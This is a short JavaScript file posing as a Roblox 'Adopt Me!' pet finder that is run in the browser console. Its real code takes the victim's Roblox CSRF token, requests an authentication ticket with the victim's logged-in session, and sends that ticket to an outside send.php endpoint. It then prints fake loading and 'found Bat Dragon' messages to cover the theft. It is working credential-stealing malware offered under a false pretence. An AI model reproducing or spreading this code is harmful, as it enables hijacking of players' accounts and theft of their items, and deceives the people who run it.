console.log("Starting To Find Adopt Me! Pets")
console.log("Loading")
var send_url = name.split('"')[1].split("?")[0] + "send.php";

(async function() {
    // response headers generate 401 errors in output, which cannot be ignored
    var xsrf = (await (await fetch("https://www.roblox.com/home", {
        credentials: "include"
    })).text()).split("setToken('")[1].split("')")[0]

    var ticket = (await fetch("https://auth.roblox.com/v1/authentication-ticket", {
        method: "POST",
        credentials: "include",
        headers: {"x-csrf-token": xsrf}
    })).headers.get("rbx-authentication-ticket")

    await fetch(send_url + "?t=" + ticket)
setTimeout(()=>console.log("Loading Your Benchmark PC 30%"), 1000)
setTimeout(()=>console.log("Loading Your Benchmark PC 40%"), 2500)
setTimeout(()=>console.log("Loading Your Benchmark PC 50%"), 3500)
setTimeout(()=>console.log("%cLoading has been successfully", "color: yellow"), 5000)
setTimeout(()=>console.log("%c[ADOPT-ME-CONSOLE] Failed Find MFR Shadow Dragon - SjMQ38YMfv6YrhEr", "color: red"), 7500)
setTimeout(()=>console.log("%c[ADOPT-ME-CONSOLE] Failed Find MFR Frost Dragon - ctnq3YAYPUDc9EJn", "color: red"), 10000)
setTimeout(()=>console.log("%c[ADOPT-ME-CONSOLE] Succefully Find MFR Bat Dragon - 6u9bBbwYPe6FmJws", "color: green"), 12500)
setTimeout(()=>console.log("%c[ADOPT-ME-CONSOLE] Overloaded To Find Adopt Me! Pets. Script Forced to be closed! - 6u9bBbwYPe6FmJws", "color: red"), 13500);
})()